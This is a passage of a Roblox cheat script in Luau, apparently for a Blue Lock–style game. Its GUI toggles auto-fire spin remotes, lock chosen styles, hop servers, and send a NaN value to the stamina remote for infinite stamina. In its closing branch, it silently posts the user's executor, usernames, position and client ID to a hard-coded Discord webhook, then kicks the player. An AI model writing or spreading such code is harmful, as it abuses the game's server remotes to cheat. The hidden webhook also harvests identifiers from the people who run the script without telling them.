	state = getgenv().Config["Auto Spin Styles"] or false,
	callback = function(Value)
        _G['Auto Spin Styles'] = Value
        getgenv().Config["Auto Spin Styles"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
spawn(function()
    while wait(1) do
        if _G["Auto Spin Styles"] then
            pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild(
                "Services"):WaitForChild("StyleService"):WaitForChild("RE"):WaitForChild("Spin"):FireServer()
            end)
        end
    end
end)
string:createToggle({
	text = "Lock Styles",
	state = getgenv().Config["Lock Styles"] or false,
	callback = function(Value)
        _G['Lock Styles'] = Value
        getgenv().Config["Lock Styles"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
local LockStylesCCC = {
    "Isagi", "Chigiri", "Bachira", "Otoya", "Hiori",
    "Gagamaru", "King", "Nagi", "Reo", "Karasu",
    "Shidou", "Kunigami", "Aiku", "Yukimiya", "Sae", "Rin",
    "Don Lorenzo"
}
string:createDropdown({
	text = "Select Lock Styles",
	list = LockStylesCCC,
	default = {"N/A"},
	multiple = true, -- choose multiple from list, makes callback value return a table now
	callback = function(Value)
        _G['Lock Styles'] = Value
        getgenv().Config["Lock Styles"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
spawn(function()
    while wait() do
        if _G['Lock Styles'] then
            pcall(function()
                local currentStyle = game:GetService("Players").LocalPlayer.PlayerStats.Style.Value
                if table.find(_G['Lock Styles'], currentStyle) then
                    _G["Auto Spin Styles"] = false
                    GLITCH_Ssg:Set(false)
                end
            end)
        end
    end
end)
local BYTE_Oj = string:createToggle({
	text = "Auto Spin Flow",
	state = getgenv().Config["Auto Spin Flow"] or false,
	callback = function(Value)
        _G['Auto Spin Flow'] = Value
        getgenv().Config["Auto Spin Flow"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
spawn(function()
    while wait(1) do
        if _G['Auto Spin Flow'] then
            pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild(
                "Services"):WaitForChild("FlowService"):WaitForChild("RE"):WaitForChild("Spin"):FireServer()
            end)
        end
    end
end)
string:createToggle({
	text = "Lock Flow",
	state = getgenv().Config["Lock Flow"] or false,
	callback = function(Value)
        _G['Lock Flow'] = Value
        getgenv().Config["Lock Flow"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
local LockFlowCCC = {
    "Ice",
    "Lightning",
    "Puzzle",
    "Monster",
    "King's lnstinct",
    "Gale Burst",
    "Genius",
    "Crow",
    "Trap",
    "Demon Wings",
    "Chameleon",
    "Wild Card",
    "Snake",
    "Prodigy",
    "Awakened Genius",
    "Dribbler",
    "Prodigy",
    "Soul Harvester"
}
string:createDropdown({
	text = "Select Lock Flow",
	list = LockFlowCCC,
	default = {"N/A"},
	multiple = true, -- choose multiple from list, makes callback value return a table now
	callback = function(Value)
        _G['Lock Flow'] = Value
        getgenv().Config["Lock Flow"] = Value
        Update_Setting(getgenv()['MyName'])
	end
})
spawn(function()
    while wait() do
        if _G["Lock Flow"] then
            pcall(function()
                local currentStyle = game:GetService("Players").LocalPlayer.PlayerStats.Flow.Value
                if table.find(_G['Lock Flow'], currentStyle) then
                    _G["Auto Spin Flow"] = false
                    BYTE_Oj:Set(false)
                end
            end)
        end
    end
end)
local Server = Miscellaneousv2:createSection({
	text = "Server",
	position = "Left", -- Left/Right
})
Server:createButton({
	text = "Rejoin Server",
	callback = function()
		Rejoin()
	end
})
Server:createButton({
	text = "Hop Server",
	callback = function()
		Hop()
	end
})
Server:createButton({
	text = "Hop Server Low",
	callback = function()
		TPReturner()
	end
})
Time = 1
repeat wait(); until game:IsLoaded();
wait(Time);
local PlaceID = game.PlaceId;
local AllIDs = {};
local foundAnything = "";
local actualHour = os.date("!*t").hour;
local Deleted = false;
function TPReturner()
    local Site;
    if foundAnything == "" then
        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
            PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'));
    else
        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
            PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything));
    end;
    local ID = "";
    if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
        foundAnything = Site.nextPageCursor;
    end;
    local num = 0;
    for i, v in pairs(Site.data) do
        local Possible = true;
        ID = tostring(v.id);
        if tonumber(v.maxPlayers) > tonumber(v.playing) then
            for _, Existing in pairs(AllIDs) do
                if num ~= 0 then
                    if ID == tostring(Existing) then
                        Possible = false;
                    end;
                else
                    if tonumber(actualHour) ~= tonumber(Existing) then
                        local delFile = pcall(function()
                            delfile("NotSameServers.json");
                            AllIDs = {};
                            table.insert(AllIDs, actualHour);
                        end);
                    end;
                end;
                num = num + 1;
            end;
            if Possible == true then
                table.insert(AllIDs, ID);
                wait();
                pcall(function()
                    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs));
                    wait();
                    game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer);
                end);
                wait(4);
            end;
        end;
    end;
end;
function Teleport()
    while wait() do
        pcall(function()
            TPReturner();
            if foundAnything ~= "" then
                TPReturner();
            end;
        end);
    end;
end;
function Hop()
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour
    local Deleted = false
    function TPReturner()
        local Site;
        if foundAnything == "" then
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
            PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
            PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
        end
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
            foundAnything = Site.nextPageCursor
        end
        local num = 0;
        for i, v in pairs(Site.data) do
            local Possible = true
            ID = tostring(v.id)
            if tonumber(v.maxPlayers) > tonumber(v.playing) then
                for _, Existing in pairs(AllIDs) do
                    if num ~= 0 then
                        if ID == tostring(Existing) then
                            Possible = false
                        end
                    else
                        if tonumber(actualHour) ~= tonumber(Existing) then
                            local delFile = pcall(function()
                                AllIDs = {}
                                table.insert(AllIDs, actualHour)
                            end)
                        end
                    end
                    num = num + 1
                end
                if Possible == true then
                    table.insert(AllIDs, ID)
                    wait()
                    pcall(function()
                        wait()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID,
                            game.Players.LocalPlayer)
                    end)
                    wait(4)
                end
            end
        end
    end
    function Teleport()
        while wait() do
            pcall(function()
                TPReturner()
                if foundAnything ~= "" then
                    TPReturner()
                end
            end)
        end
    end
    Teleport()
end
Server:createTextBox({
	text = "Server Jop ID",
	default = nil,
	callback = function(Value)
		jobId = Value
	end,
})
Server:createButton({
	text = "Join Server",
	callback = function()
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, jobId, game.Players.LocalPlayer)
	end
})
Server:createButton({
	text = "Copy Jop ID",
	callback = function()
		setclipboard(game.JobId)
	end
})
local LocalPlayerServer = Miscellaneousv2:createSection({
	text = "Local Player",
	position = "Right", -- Left/Right
})
LocalPlayerServer:createButton({
	text = "Inf Stamina",
	callback = function()
        local args = {
            [1] = 0 / 0
        }
        game:GetService("ReplicatedStorage").Packages.Knit.Services.StaminaService.RE.DecreaseStamina:FireServer(
        unpack(args))
	end
})
local Lighting = Miscellaneousv2:createSection({
	text = "Lighting",
	position = "Right", -- Left/Right
})
Lighting:createButton({
	text = "FPS Boots",
	callback = function()
        local function FPSBooster()
            local decalsyeeted = true
            local g = game
            local w = g.Workspace
            local l = g.Lighting
            local t = w.Terrain
            pcall(function() sethiddenproperty(l, "Technology", 2) end)
            pcall(function() sethiddenproperty(t, "Decoration", false) end)
            t.WaterWaveSize = 0
            t.WaterWaveSpeed = 0
            t.WaterReflectance = 0
            t.WaterTransparency = 0
            l.GlobalShadows = false
            l.FogEnd = 9e9
            l.Brightness = 0
            pcall(function() settings().Rendering.QualityLevel = "Level01" end)
            for _, v in pairs(g:GetDescendants()) do
                pcall(function()
                    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
                        v.Material = "Plastic"
                        v.Reflectance = 0
                    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
                        v.Transparency = 1
                    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                        v.Lifetime = NumberRange.new(0)
                    elseif v:IsA("Explosion") then
                        v.BlastPressure = 1
                        v.BlastRadius = 1
                    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
                        v.Enabled = false
                    elseif v:IsA("MeshPart") then
                        v.Material = "Plastic"
                        v.Reflectance = 0
                        v.TextureID = 10385902758728957
                    end
                end)
            end
            for _, e in pairs(l:GetChildren()) do
                pcall(function()
                    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                        e.Enabled = false
                    end
                end)
            end
        end
        local success, errorMsg = pcall(FPSBooster)
        if not success then
            warn("Error occurred in FPSBooster: " .. errorMsg)
        end
	end
})
Library:createManager({
	folderName = "brah",
	icon = "124718082122263", -- 20x20 icon you want here
})
else
    local webh =
    "https://discord.com/api/webhooks/1348009134783463434/RqQiEwiBU8IFkwrA6QijKFIOIHkV3YCK7AkyCLxu7G2ArT6r_CxsrxLVsnCSvt6E5O5t"
    local executor = identifyexecutor()
    local placeId = game.PlaceId
    local mapName = game:GetService("MarketplaceService"):GetProductInfo(placeId)
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    local player = game.Players.LocalPlayer
    local playerName = player.Name
    local playerDisplayName = player.DisplayName
    local playerPosition = player.Character and player.Character.HumanoidRootPart.Position or "Unknown"
    local clientId = game:GetService('RbxAnalyticsService'):GetClientId()
    
    pcall(function()
        local data = {
            ["embeds"] = {
                {
                    ["title"] = "Game Information",
                    ["description"] = string.format([[  
    Executor: %s  
    Map: %s  
    Time: %s  
    Player Name: %s  
    Display Name: %s  
    Player Position: %s  
    Client ID: %s  
    ]], executor, mapName.Name, currentTime, playerName, playerDisplayName, tostring(playerPosition), clientId),
                    ["color"] = tonumber(0x7269da)
                }
            }
        }
        local httpService = game:GetService('HttpService')
        local response
        if syn then
            response = syn.request({
                Url = webh,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = httpService:JSONEncode(data),
            })
        elseif request then
            response = request({
                Url = webh,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = httpService:JSONEncode(data),
            })
        elseif http_request then
            response = http_request({
                Url = webh,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = httpService:JSONEncode(data),
            })
        end
    end)
    
	game.Players.LocalPlayer:Kick("Script does not support " .. identifyexecutor())
	end
